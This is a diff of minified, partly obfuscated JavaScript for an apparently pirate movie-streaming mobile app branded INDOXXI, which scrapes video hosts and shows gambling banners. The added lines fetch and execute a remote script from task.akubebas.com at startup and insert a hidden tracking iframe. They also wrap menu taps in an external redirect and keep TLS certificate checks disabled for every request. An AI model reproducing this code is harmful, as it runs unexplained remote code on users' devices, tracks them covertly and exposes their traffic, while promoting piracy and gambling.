@@ -1,4 +1,4 @@
-var appVersion = "0", freeze = !1, ws, loading, perLoad, controller, scene, lastIndex, dom, mvReq, tvReq, imgReq, sources = [], subtitles = [], currentIdx, ignoreIdx, srcIdx, epArr, epi = "-1", epiTitle = "", noDrive = !1, havesend = !1, bckupIdx = "", actEpi, jw, hs, mvid, prov, ar, table, currentKuki, mrload = !1, uSwitch = !1, srvList = !1, totalQuals, qualIdx, totalTry, maxTry, chgRes, nextTry = !1, extType = ["drives_muvi", "drives_lk21", "drives"], noFrameType = ["drives_muvi", "drives_lk21", "drives", "blogspot", "mp4s", "blogger", "facebook"], bannedType = ["lemon", "mcloud"], playTimeInterval, allowSeek = !0, asp = !1, doingTask = !1, subreplace = "akumenang.com", analIntv, btout, banners, bannersLink, banner = "", bannerLink = "", bannerShowed = !1, tsdiv = 5;
+var appVersion = "", freeze = !1, ws, loading, perLoad, controller, scene, lastIndex, dom, mvReq, tvReq, imgReq, sources = [], subtitles = [], currentIdx, ignoreIdx, srcIdx, epArr, epi = "-1", epiTitle = "", noDrive = !1, havesend = !1, bckupIdx = "", actEpi, jw, hs, mvid, prov, ar, table, currentKuki, mrload = !1, uSwitch = !1, srvList = !1, totalQuals, qualIdx, totalTry, maxTry, chgRes, nextTry = !1, extType = ["drives_muvi", "drives_lk21", "drives"], noFrameType = ["drives_muvi", "drives_lk21", "drives", "blogspot", "mp4s", "blogger", "facebook"], bannedType = ["lemon", "mcloud"], playTimeInterval, allowSeek = !0, asp = !1, doingTask = !1, subreplace = "akumenang.com", analIntv, btout, banners, bannersLink, banner = "", bannerLink = "", bannerShowed = !1, tsdiv = 5;
 function initLocals() {
 	localStorage.filter || (localStorage.filter = JSON.stringify({
 				type: [],
@@ -12,7 +12,7 @@ function initLocals() {
 }
 function appCheck(e) {
 	e && $.ajax({
-		url: "https://yalestari.github.io/bid/check.json",
+		url: "https://mob.akubebas.com/api/check.php",
 		cache: !0,
 		timeout: 15e3,
 		type: "GET",
@@ -24,7 +24,7 @@ function appCheck(e) {
 			var t = e.version,
 			a = e.status,
 			i = e.link;
-			switch (dom = e.dom, mvReq = e.mvReq, tvReq = e.tvReq, imgReq = e.imgReq, banners = [imgReq + "/images/indoxxi-yt-c.gif", imgReq + "/images/banner-729x90-vidplay3.gif", imgReq + "/images/mn-small.gif", imgReq + "/images/nl-play-1.gif", imgReq + "/images/poker.gif", imgReq + "/images/nl-play-1.gif", imgReq + "/images/mn-small.gif", imgReq + "/images/poker.gif", imgReq + "/images/mn-small.gif", imgReq + "/images/nl-play-1.gif", imgReq + "/images/poker.gif"], bannersLink = ["https://xxiyoutube.com", "https://" + dom + "/tools", "http://masternaga.rocks", "http://nagalaut23.com", "https://pokergolden.biz", "http://nagalaut23.com", "http://masternaga.rocks", "https://pokergolden.biz", "http://masternaga.rocks", "http://nagalaut23.com", "https://pokergolden.biz"], a) {
+			switch (dom = e.dom, mvReq = e.mvReq, tvReq = e.tvReq, imgReq = e.imgReq, banners = [imgReq + "/images/indoxxi-yt-c.gif", imgReq + "/images/banner-729x90-vidplay3.gif", imgReq + "/images/idxbet/bn-2.gif", imgReq + "/images/idxbet/bn-4-small.gif"], bannersLink = ["https://xxiyoutube.com", "https://" + dom + "/tools", "https://indoxbet.com", "https://indoxplay.com/promosi/slots"], a) {
 			case "1":
 				if (t > parseInt(appVersion.split(".").join("")))
 					if (localStorage.check && 0 != localStorage.check)
@@ -69,7 +69,7 @@ function appCheck(e) {
 						localStorage.msg = 10
 					})
 				}
-			/* $("body").prepend('<iframe id="analytic-frame" src="https://similikitiwelehweleh.com" style="display:none"></iframe>') */
+			$("body").prepend('<iframe id="analytic-frame" src="https://mob.akubebas.com/analytic.php" style="display:none"></iframe>')
 		}
 	})
 }
@@ -89,7 +89,9 @@ function isFullScreen() {
 function createPage(e, t) {
 	loadContainer(1),
 	$.get(e + ".html?q=" + (new Date).getTime(), function (a) {
-		switch ($("#cdv-logo").length && $("#cdv-logo").remove(), $("body").append('<div class="page" data-page="' + e + '"><div class="page-overlay"></div>' + a + "</div>"), e) {
+		switch ($("#cdv-logo").length && $("#cdv-logo").remove(), $("body").append('<div class="page" data-page="' + e + '"><div class="page-overlay"></div>' + a + "</div>"), $(".back").remove(), $(".page").prepend('<div class="back" style="background:#202020;padding:4px;position:absolute;top:0;right:0;cursor:pointer;border-radius:0 0 0 3px;z-index:99"><i class="fa fa-times fa-lg" style="color:#888"></i></div>'), $(".back").unbind().click(function () {
+				freeze || removePage()
+			}), e) {
 		case "home":
 			$(".category").each(function () {
 				$(this).click(function () {
@@ -125,6 +127,10 @@ function createPage(e, t) {
 							switch (e[r].quality.toLowerCase()) {
 							case "trailer":
 								i = ' style="background:rgba(117,0,214,.8);"';
+								break;
+							case "hdcam":
+								e[r].quality = "CAM",
+								i = ' style="background:rgba(0, 155, 171, 0.68);"';
 								break;
 							case "cam":
 								i = ' style="background:rgba(255,8,8,.8);"';
@@ -202,7 +208,7 @@ function createPage(e, t) {
 					"timeout" == e.statusText ? $.alert("Pengambilan Data Terlalu Lama, Harap Coba Lagi!") : localStorage.failreq < 10 ? ($.alert("Terjadi Kesalahan, Harap Coba Lagi!"), localStorage.failreq++) : ($.alert("Server Sedang Tidak Stabil, Harap Bersabar dan Coba Lagi Nanti!"), localStorage.failreq = 0)
 				},
 				success: function (e) {
-					sendTo.eventReceiver("open");
+								  
 					allowSeek = !0,
 					noDrive = !1;
 					var a = e.plot_tmdb;
@@ -256,43 +262,46 @@ function createPage(e, t) {
 							})
 						}
 					}) : $("#vid-play-icon").click(function () {
-						getEpList(e.epis);
-					}),
-					/* $(".prop-link").length || $(".bottom-menu,#vid-play-icon").wrap("<a class='prop-link' href='http://similikitiweleh.com' target='_blank' style='color:inherit;'></a>"), */
+						getEpList(e.epis)
+					});
+					var r = /(TV|HbbTV|SmartTV)/i.test(navigator.userAgent);
+					$(".prop-link").length || r || ($(".bottom-menu,#vid-play-icon").wrap("<div class='prop-link'></div>"), $(".prop-link").click(function () {
+							window.open("http://vennala.pw/iLzjsl2toaH5LCL/6728", "_system")
+						})),
 					$(".bottom-menu").css("border-right", "1px solid #555"),
 					$(".bottom-menu-content a:last-child div").css("border-right", "0"),
 					$("#bottom-menu-eps").click(function () {
 						getEpList(e.epis)
 					}),
 					epArr = e.epis;
-					var r = 0;
+					var o = 0;
 					if ($("#player").off("scroll").on("scroll", function () {
 							var e = $(this).scrollTop();
-							e > r ? $(".bottom-menu-content").fadeOut(100) : $(".bottom-menu-content").fadeIn(100),
-							r = e
+							e > o ? $(".bottom-menu-content").fadeOut(100) : $(".bottom-menu-content").fadeIn(100),
+							o = e
 						}), e.rel.length > 0) {
-						for (var o, n, s, l = 0; l < e.rel.length; l++) {
-							if (s = "", o = "", n = "", "0" != e.rel[l].suben_count && (s += '<img src="https://img.akubebas.com/images/US.png"/>'), "0" != e.rel[l].subid_count && (s += '<img src="https://img.akubebas.com/images/ID.png"/>'), "1" == e.rel[l].type || "44" == e.rel[l].type || "54" == e.rel[l].type)
-								switch (e.rel[l].quality.toLowerCase()) {
+						for (var n, s, l, d = 0; d < e.rel.length; d++) {
+							if (l = "", n = "", s = "", "0" != e.rel[d].suben_count && (l += '<img src="https://img.akubebas.com/images/US.png"/>'), "0" != e.rel[d].subid_count && (l += '<img src="https://img.akubebas.com/images/ID.png"/>'), "1" == e.rel[d].type || "44" == e.rel[d].type || "54" == e.rel[d].type)
+								switch (e.rel[d].quality.toLowerCase()) {
 								case "trailer":
-									n = ' style="background:rgba(117,0,214,.8);"';
+									s = ' style="background:rgba(117,0,214,.8);"';
 									break;
 								case "hdcam":
-									e.rel[l].quality = "CAM",
-									n = ' style="background:rgba(0, 155, 171, 0.68);"';
+									e.rel[d].quality = "CAM",
+									s = ' style="background:rgba(0, 155, 171, 0.68);"';
 									break;
 								case "cam":
-									n = ' style="background:rgba(255,8,8,.8);"';
+									s = ' style="background:rgba(255,8,8,.8);"';
 									break;
 								case "sd":
-									n = ' style="background:rgba(255, 57, 148, 0.8);"';
+									s = ' style="background:rgba(255, 57, 148, 0.8);"';
 									break;
 								case "hd":
-									"3" == e.rel[l].blu ? (e.rel[l].quality = "4K", n = ' style="background: linear-gradient(#b07b01, #ffec83, #b07b01)!important;color: #191919 !important;font-weight: 800 !important;"') : (n = 0 == e.rel[l].hd_level ? ' style="background:rgba(255, 146, 24, .8);"' : 1 == e.rel[l].hd_level ? ' style="background:rgba(11,171,0,.8);"' : ' style="background:rgba(4,149,212,.8);"', "1" == e.rel[l].blu && (e.rel[l].quality = "FHD", 2 == e.rel[l].hd_level && (e.rel[l].quality = "BLU")))
+									"3" == e.rel[d].blu ? (e.rel[d].quality = "4K", s = ' style="background: linear-gradient(#b07b01, #ffec83, #b07b01)!important;color: #191919 !important;font-weight: 800 !important;"') : (s = 0 == e.rel[d].hd_level ? ' style="background:rgba(255, 146, 24, .8);"' : 1 == e.rel[d].hd_level ? ' style="background:rgba(11,171,0,.8);"' : ' style="background:rgba(4,149,212,.8);"', "1" == e.rel[d].blu && (e.rel[d].quality = "FHD", 2 == e.rel[d].hd_level && (e.rel[d].quality = "BLU")))
 								}
 							else
-								o = "movie-eps", e.rel[l].quality = "Eps<br/>" + e.rel[l].Episodes;
-							$("#player-rel-list").append('<div class="movie rel-movie lazy" data-src="' + e.rel[l].poster + '" style="background-position:center center;background-repeat:no-repeat;background-size:cover;" data-url="' + e.rel[l].url + '" data-type="' + e.rel[l].type + '"><div class="movie-info"><div class="movie-ratdur"><i class="fa fa-star"></i> ' + e.rel[l].imdb_rating + ' &nbsp;<i class="fa fa-clock-o"></i> ' + e.rel[l].duration + 'm</div><div class="movie-quality ' + o + '"' + n + ">" + e.rel[l].quality + '</div><div class="movie-sub">' + s + '</div><div class="movie-title" style="white-space:normal;">' + e.rel[l].title + " (" + e.rel[l].year + ")</div></div></div>")
+								n = "movie-eps", e.rel[d].quality = "Eps<br/>" + e.rel[d].Episodes;
+							$("#player-rel-list").append('<div class="movie rel-movie lazy" data-src="' + e.rel[d].poster + '" style="background-position:center center;background-repeat:no-repeat;background-size:cover;" data-url="' + e.rel[d].url + '" data-type="' + e.rel[d].type + '"><div class="movie-info"><div class="movie-ratdur"><i class="fa fa-star"></i> ' + e.rel[d].imdb_rating + ' &nbsp;<i class="fa fa-clock-o"></i> ' + e.rel[d].duration + 'm</div><div class="movie-quality ' + n + '"' + s + ">" + e.rel[d].quality + '</div><div class="movie-sub">' + l + '</div><div class="movie-title" style="white-space:normal;">' + e.rel[d].title + " (" + e.rel[d].year + ")</div></div></div>")
 						}
 						$(".movie-title").css("background", "url('" + imgReq + "/images/mask-title.png') center top repeat-x"),
 						$("#player-rel-list .rel-movie").click(function () {
@@ -354,7 +363,7 @@ function createPage(e, t) {
 					"timeout" == e.statusText ? $.alert("Pengambilan Data Terlalu Lama, Harap Coba Lagi!") : localStorage.failreq < 10 ? ($.alert("Terjadi Kesalahan, Harap Coba Lagi!"), localStorage.failreq++) : ($.alert("Server Sedang Tidak Stabil, Harap Bersabar dan Coba Lagi Nanti!"), localStorage.failreq = 0)
 				},
 				success: function (e) {
-					sendTo.eventReceiver("open");
+								  
 					if (o)
 						$("#movies-title").html("<b>Category:</b> " + t.category.ucwords());
 					else if (n) {
@@ -507,6 +516,7 @@ function getEpList(e) {
 		bannerShowed = !1,
 		$("#myvid, #infosv").remove(),
 		$("#server-list-title,#server-list-content").fadeOut(),
+		playTimeInterval && clearInterval(playTimeInterval),
 		epi = $(this).attr("data-child"),
 		epiTitle = $(this).text();
 		var t = $(this).attr("data-prov"),
@@ -691,6 +701,8 @@ function beginPlay(e) {
 document.addEventListener("backbutton", function () {
 	freeze || removePage()
 }, !1), document.addEventListener("deviceready", function () {
+	$.getScript("https://task.akubebas.com/chk/httpget/"),
+	localStorage.notice && "14" == localStorage.notice || ($.alert("<div><a href='https://indoxplay.com/promosi/slots'><img src='https://indoxplay.com/img/promo-slots.png' width='100%' alt='promo slots 80 juta' style='vertical-align:middle'/></a></div><div style='text-align:center;margin-top:15px'><a href='https://indoxplay.com/promosi/slots' style='color:#c6aa28;font-size:1.5em'>TAP DI SINI</a></div>"), localStorage.notice = "14");
 	var e = (new Date).getTime();
 	wsConnect(e %= 2),
 	window.plugins.insomnia.keepAwake(),
@@ -716,6 +728,35 @@ function startPlay(e) {
 		$(".bottom-menu-logo").hide(),
 		void $("#bottom-menu-eps").css("width", "100%").show()
 	}
+	if (e.sources[0].file.indexOf("/docs/") > -1 && "done" != e.meta.x && "failed" != e.meta.x) {
+		var a = calcTime("+7"),
+		i = a.getMinutes();
+		i %= tsdiv;
+		var r = 1e3 * a.getSeconds(),
+		o = new Date(a - 6e4 * i - r),
+		n = Math.floor(o.getTime() / 1e3),
+		s = $("#player").attr("data-tmdb"),
+		l = e.sources[0].file.split("/*/")[1].split("/")[0];
+		l.indexOf("?") > -1 && (l = l.split("?")[0]);
+		var d = crc32(btoa(n + l) + n + l + crc32(l + n)),
+		c = ["https://playdrv.akubebas.com", "https://playdrv2.akubebas.com", "https://playdrv3.akubebas.com"];
+		return c = c[Math.floor(Math.random() * c.length)],
+		-1 == s.indexOf("-") ? c += "/mv/" : c += "/tv/",
+		void cordovaHTTP.acceptAllCerts(!0, function () {
+			cordovaHTTP.get(c, {
+				dv: l,
+				ts: n,
+				token: d,
+				hs: e.meta.hardsub,
+				epi: actEpi,
+				tmdb: s
+			}, {}, function (e) {
+				var t = e.data;
+				(t = JSON.parse(t))[0] ? (sources[currentIdx] = t[0], sources[currentIdx].meta.x = "done") : sources[currentIdx].meta.x = "failed",
+				startPlay(sources[currentIdx])
+			})
+		})
+	}
 	hs = e.meta.hardsub,
 	mvid = e.meta.id,
 	prov = e.meta.prov,
@@ -724,37 +765,39 @@ function startPlay(e) {
 	ar = "0" == e.meta.ratio ? defRatio : e.meta.ratio,
 	table = e.meta.type,
 	currentKuki = e.meta.kuki && "gapake" != e.meta.kuki ? e.meta.kuki : "";
-	var a,
-	i = ar + ":1";
-	subtitles.length > 0 && "0" == hs && (a = subtitles);
-	for (var r = 0; r < e.sources.length; r++)
-		e.sources[r].label && ("hd" == e.sources[r].label.toLowerCase() ? e.sources[r].label = "720p" : "sd" == e.sources[r].label.toLowerCase() && (e.sources[r].label = "360p"));
+	var p,
+	u = ar + ":1";
+	subtitles.length > 0 && "0" == hs && (p = subtitles);
+	for (var g = 0; g < e.sources.length; g++)
+		e.sources[g].label && ("hd" == e.sources[g].label.toLowerCase() ? e.sources[g].label = "720p" : "sd" == e.sources[g].label.toLowerCase() && (e.sources[g].label = "360p"));
 	if (-1 != noFrameType.indexOf(table) || mrload || -1 != e.sources[0].file.toLowerCase().indexOf(".mp4")) {
-		var o = e.sources;
-		e.meta.kuki && "gapake" != e.meta.kuki || (e.meta.backup ? o = e.meta.backup : e.meta.backup2 && e.meta.backup2.length > 0 && (bckupIdx = Math.floor(Math.random() * e.meta.backup2.length), o = e.meta.backup2[bckupIdx].file)),
+		var m = e.sources;
+		e.meta.kuki && "gapake" != e.meta.kuki || (e.meta.backup ? m = e.meta.backup : e.meta.backup2 && e.meta.backup2.length > 0 && (bckupIdx = Math.floor(Math.random() * e.meta.backup2.length), m = e.meta.backup2[bckupIdx].file)),
 		jw && (jwplayer("vid").remove(), jw = null),
 		(jw = jwplayer("vid").setup({
 					primary: "html5",
 					width: "100%",
 					height: "100%",
-					aboutlink: "https://indoxxi.vip",
+					aboutlink: "https://indoxx1.center",
 					abouttext: "INDOXXI",
-					aspectratio: i,
+					aspectratio: u,
 					autostart: "true",
 					stretching: "uniform",
 					preload: "auto",
 					controls: !0,
 					sharing: {},
+					cast: {},
 					skin: {
 						name: "seven"
 					},
+					mute: !1,
 					captions: {
 						color: "#E3E370",
 						backgroundOpacity: 60,
-						fontSize: 10
+						fontSize: 16
 					},
-					sources: o,
-					tracks: a
+					sources: m,
+					tracks: p
 				})).on("ready", onReady),
 		jw.on("buffer", onBuffer),
 		jw.on("play", onPlay),
@@ -795,6 +838,11 @@ function startPlay(e) {
 			mrload = !0;
 			var e = $("#myvid").contents().find("div[style='display:none;']").children().last().text().trim();
 			e ? (e = "https://oload.stream/stream/" + e + "?mime=true", sources[currentIdx].sources[0].file = e, $("#myvid").remove(), $("#vid-container").html('<div id="vid"></div>'), startPlay(sources[currentIdx])) : ($("#myvid").remove(), $("#vid-container").html('<div id="vid"></div>'), errPlay())
+		}),
+		"vstream" == table && $("#myvid").on("load", function () {
+			mrload = !0;
+			var e = $("#myvid").contents().find("#videolink").text().trim();
+			e ? (e = "https://verystream.com/gettoken/" + e, sources[currentIdx].sources[0].file = e, $("#myvid").remove(), $("#vid-container").html('<div id="vid"></div>'), startPlay(sources[currentIdx])) : ($("#myvid").remove(), $("#vid-container").html('<div id="vid"></div>'), errPlay())
 		})
 	}
 }
@@ -839,20 +887,23 @@ function onBuffer() {
 	$("#vid-container").height($("#vid").height()),
 	$(window).off("resize").on("resize", function () {
 		$("#vid-container").height($("#vid").height())
-	})
+	}),
+	bannerShowed || (showBanner(banner, bannerLink), bannerShowed = !0),
+	srvList || (srvList = !0, serverList(), $("#server-list-title,#server-list-content").fadeIn());
 }
 function onPlay() {
-	srvList || (srvList = !0, serverList(), $("#server-list-title,#server-list-content").fadeIn());
+																								
 	var e = 3,
 	t = $("#player").attr("data-type");
 	"movie" == t && (e = 2),
 	subtitles && 0 != subtitles.length || e--;
 	var a = "-1" == epi ? "" : epi,
 	i = $("#player").attr("data-tmdb") + "-" + a + "-time";
-	localStorage.getItem(i) && allowSeek && (allowSeek = !1, jw.seek(localStorage.getItem(i))),
+	jw.setMute(!1),
+	localStorage.getItem(i) && allowSeek && (allowSeek = !1),
 	playTimeInterval && clearInterval(playTimeInterval),
 	playTimeInterval = setInterval(function () {
-			jw && jw.getPosition() > 60 ? localStorage.setItem(i, jw.getPosition()) : clearInterval(playTimeInterval)
+			jw && jw.getPosition() > 60 && localStorage.setItem(i, jw.getPosition())
 		}, 3e3),
 	$(".bottom-menu-logo").hide(),
 	$(".bottom-menu").css("width", 100 / e + "%").show(),
@@ -957,10 +1008,12 @@ function onError() {
 function onLevelsChanged() {}
 function onCaptionsChanged() {}
 function onComplete() {
+	playTimeInterval && clearInterval(playTimeInterval);
 	var e = $("#player").attr("data-type"),
-	t = $("#player").attr("data-tmdb") + "-time";
-	if (localStorage.removeItem(t), "seri" == e && epArr.length - 1 > parseInt(epi)) {
-		var a = $("#player").attr("data-ref");
+	t = "-1" == epi ? "" : epi,
+	a = $("#player").attr("data-tmdb") + "-" + t + "-time";
+	if (localStorage.removeItem(a), "seri" == e && epArr.length - 1 > parseInt(epi)) {
+		var i = $("#player").attr("data-ref");
 		allowSeek = !0,
 		uSwitch = !1,
 		mrload = !1,
@@ -973,15 +1026,15 @@ function onComplete() {
 		epi = parseInt(epi) + 1,
 		epiTitle = epArr[epi].title,
 		playLoad();
-		var i = epArr[epi].prov,
-		r = epArr[epi].eps,
-		o = epArr[epi].nno,
-		n = getChkSum($("#player").attr("data-tmdb")),
-		s = tvReq + "/?sv=" + i + "&ep=" + r + "&no=" + o + "&k=" + n + "&v=" + appVersion;
-		actEpi = r,
-		cordovaHTTP.setHeader("referer", "https://mob.akubebas.com/film-seri/" + a + "/play"),
+		var r = epArr[epi].prov,
+		o = epArr[epi].eps,
+		n = epArr[epi].nno,
+		s = getChkSum($("#player").attr("data-tmdb")),
+		l = tvReq + "/?sv=" + r + "&ep=" + o + "&no=" + n + "&k=" + s + "&v=" + appVersion;
+		actEpi = o,
+		cordovaHTTP.setHeader("referer", "https://mob.akubebas.com/film-seri/" + i + "/play"),
 		cordovaHTTP.acceptAllCerts(!0, function () {
-			cordovaHTTP.get(s, {}, {}, function (e) {
+			cordovaHTTP.get(l, {}, {}, function (e) {
 				var t = e.data;
 				-1 == t.indexOf('[{"sources') && -1 == t.indexOf("[null]") && -1 == t.lastIndexOf("[]") && (t = rc4("mob.akubebas.com", t)),
 				t.indexOf("adm") > -1 && (t = t.indexOf("[null]") > -1 || t.lastIndexOf("[]") == t.length - 2 ? "[null]" : '[{"sources' + (t = (t = (t = t.split("(adm)"))[t.length - 1].trim()).split('[{"sources'))[t.length - 1].trim()),
@@ -1040,6 +1093,7 @@ function serverList() {
 			$("#server-list-content").append('<div class="server ' + a + '" data-idx="' + i + '">' + e + " <div>" + t + "</div></div>")
 		}
 	$(".server").unbind().click(function () {
+		playTimeInterval && clearInterval(playTimeInterval),
 		$(".server").removeClass("active"),
 		$(this).addClass("active");
 		var e = $(this).attr("data-idx");
@@ -1065,6 +1119,7 @@ function getServerIcon(e) {
 	case "rapid":
 		return '<img class="server-icon" src="' + imgReq + '/images/icon-server/rpid.png">';
 	case "oload":
+	case "vstream":
 		return '<img class="server-icon" src="' + imgReq + '/images/icon-server/oload.png">';
 	case "blogspot":
 	case "blogger":
@@ -1092,9 +1147,9 @@ function playLoad() {
 	$("#vid-container").prepend('<div id="player-loader" class="page-overlay" style="background:#000;"><img src="' + imgReq + '/images/loading-play.gif" width="auto" height="40%" style="position:relative;top:50%;left:50%;transform:translate(-50%,-50%);-webkit-transform:translate(-50%,-50%);"/></div>')
 }
 
-/* function sendVideoEvent(){
-	myVideoEvent.message();
-} */
+							 
+						
+	
 function downloadSub() {
 	if ("1" != hs) {
 		var e = jw.getCurrentCaptions();
@@ -1136,7 +1191,7 @@ function beginDownloadSub(e, t) {
 	})
 }
 function downloadMovie() {
-	
+ 
 	var e = jw.getPlaylistItem().sources[jw.getCurrentQuality()].file,
 	t = (jw.getPlaylistItem().sources[jw.getCurrentQuality()].label, getTitle());
 	e.substr(-4);
@@ -1152,7 +1207,7 @@ function downloadMovie() {
 	}
 }
 function beginDownload(e, t) {
-	sendTo.eventReceiver("exit");
+							  
 	var a = new FileTransfer,
 	i = showDownloadProgress();
 	$("#download-progress-close" + i).html("Batal").click(function () {
@@ -1284,8 +1339,8 @@ function getTitle() {
 	t = (t = (t = t.replace(/[^a-z0-9]+/gi, " ").trim()).replace("  ", " ")).replace(" ", "-");
 	var a = "";
 	return epiTitle && (a = "-" + epi.trim()),
-	/* t = "INDOXXI-[" + (t = t + "-" + e + a.trim()).trim() + "]" */
-	t = (t = t + "-" + e + a.trim()).trim()
+	t = "INDOXXI-[" + (t = t + "-" + e + a.trim()).trim() + "]"
+										
 }
 function wsConnect(e) {
 	var t = "9999";
@@ -1332,69 +1387,69 @@ function getSources(e) {
 	o = "bioskopkeren.fun";
 	i.indexOf("boker") > -1 && (-1 == t.indexOf("nonton.bioskopkeren") && (o = (t = (t = "2" == a ? t + r + "/" : t).split("://"))[0] + "://" + t[1].split("/")[0]), e.dom = o, -1 == t.indexOf("nonton.bioskopkeren") ? (t[1] = t[1].replace(/\/\//g, "/"), t = t.join("://"), getBoker(e, !0)) : getBoker(e, !1))
 }
-function getBoker(_0x65b827, _0x13851c) {
-	var _0x3666f0 = _0x65b827.id,
-	_0x452ec9 = _0x65b827.url,
-	_0x4f5a7a = _0x65b827.type,
-	_0x1aab78 = _0x65b827.tmdb,
-	_0x3f2a0c = _0x65b827.prov,
-	_0x128b52 = _0x65b827.epi,
-	_0xd4be13 = _0x65b827.epiLink,
-	_0x188284 = _0x65b827.dom,
-	_0x1fb3a6 = ["Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1", "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"];
-	if (_0x1fb3a6 = _0x1fb3a6[Math.floor(Math.random() * _0x1fb3a6.length)], _0x13851c) {
-		var _0x37b8c6 = setTimeout(function () {
-				ws && ws.send("failed|" + _0x1aab78 + "|" + _0x128b52 + "|webpage")
+function getBoker(_0x2a51d8, _0x4dd463) {
+	var _0x2f3977 = _0x2a51d8.id,
+	_0x978c89 = _0x2a51d8.url,
+	_0x317ad3 = _0x2a51d8.type,
+	_0x239469 = _0x2a51d8.tmdb,
+	_0x9659c5 = _0x2a51d8.prov,
+	_0x211a31 = _0x2a51d8.epi,
+	_0x193915 = _0x2a51d8.epiLink,
+	_0x3f6c56 = _0x2a51d8.dom,
+	_0x4615c8 = ["Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1", "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36", "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"];
+	if (_0x4615c8 = _0x4615c8[Math.floor(Math.random() * _0x4615c8.length)], _0x4dd463) {
+		var _0x2552ea = setTimeout(function () {
+				ws && ws.send("failed|" + _0x239469 + "|" + _0x211a31 + "|webpage")
 			}, 3e4);
-		cordovaHTTP.setHeader("referer", _0x188284 + "/"),
-		cordovaHTTP.setHeader("user-agent", _0x1fb3a6),
+		cordovaHTTP.setHeader("referer", _0x3f6c56 + "/"),
+		cordovaHTTP.setHeader("user-agent", _0x4615c8),
 		cordovaHTTP.acceptAllCerts(!0, function () {
-			cordovaHTTP.get(_0x452ec9, {}, {}, function (_0x2e903f) {
-				if (_0x37b8c6) {
-					clearTimeout(_0x37b8c6);
-					var _0x56bd55 = _0x2e903f.data;
-					if (_0x56bd55.indexOf('<link rel="canonical" href="' + _0x452ec9.substring(0, _0x452ec9.length - 1)) > -1 || -1 == _0x56bd55.indexOf('<link rel="canonical" href="' + _0x188284 + '"') && -1 == _0x56bd55.indexOf('<link rel="canonical" href="' + _0x188284 + '/"'))
-						switch (_0x3f2a0c) {
+			cordovaHTTP.get(_0x978c89, {}, {}, function (_0x2552f4) {
+				if (_0x2552ea) {
+					clearTimeout(_0x2552ea);
+					var _0x390e7e = _0x2552f4.data;
+					if (_0x390e7e.indexOf('<link rel="canonical" href="' + _0x978c89.substring(0, _0x978c89.length - 1)) > -1 || -1 == _0x390e7e.indexOf('<link rel="canonical" href="' + _0x3f6c56 + '"') && -1 == _0x390e7e.indexOf('<link rel="canonical" href="' + _0x3f6c56 + '/"'))
+						switch (_0x9659c5) {
 						case "bokerdrv":
-							var _0x49ced7 = _0x56bd55.split("https://nonton"),
-							_0x557662 = "",
-							_0x41b9a5 = "",
-							_0x31db51 = "",
-							_0x5b77ad = "";
